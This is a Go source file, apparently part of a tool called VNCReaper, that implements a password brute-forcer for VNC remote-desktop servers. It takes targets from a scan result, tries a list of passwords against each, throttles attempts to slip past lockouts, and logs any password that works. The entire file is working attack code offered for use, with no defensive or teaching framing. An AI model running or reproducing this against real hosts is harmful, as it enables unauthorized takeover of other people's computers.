package brute

import (
    "fmt"
    "log"
    "net"
    "time"

    vnc "github.com/mitchellh/go-vnc"
    "github.com/comedymoon/VNCReaper/internal/types"
)

type BruteManager struct {
    Passwords []string // was: passwords
    retries   map[string]int
    maxRetry  int
    waitTime  time.Duration
}

func NewBruteManager(passwords []string) *BruteManager {
    return &BruteManager{
        Passwords: passwords,
        retries:   make(map[string]int),
        maxRetry:  3,
        waitTime:  10 * time.Second,
    }
}

// TryAll tries all passwords against the given VNC target
func (bm *BruteManager) TryAll(target types.ScanResult) {
    addr := fmt.Sprintf("%s:%s", target.IP, target.Port)

    if bm.retries[addr] >= bm.maxRetry {
        log.Printf("[BRUTE] Skipping %s, max retries reached", addr)
        return
    }

    for _, pwd := range bm.Passwords {
        ok := bm.tryPassword(addr, pwd)
        if ok {
            log.Printf("[BRUTE] SUCCESS %s password: %s", addr, pwd)
            return
        } else {
            bm.retries[addr]++
            log.Printf("[BRUTE] FAIL %s password: %s (retry %d/%d)", addr, pwd, bm.retries[addr], bm.maxRetry)
            time.Sleep(bm.waitTime)
            if bm.retries[addr] >= bm.maxRetry {
                log.Printf("[BRUTE] Giving up on %s", addr)
                return
            }
        }
    }
}

func (bm *BruteManager) tryPassword(addr string, password string) bool {
    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()

    cfg := &vnc.ClientConfig{
        Auth: []vnc.ClientAuth{
            &vnc.PasswordAuth{Password: password},
        },
    }

    client, err := vnc.Client(conn, cfg)
    if err != nil {
        return false
    }
    defer client.Close()

    return true
}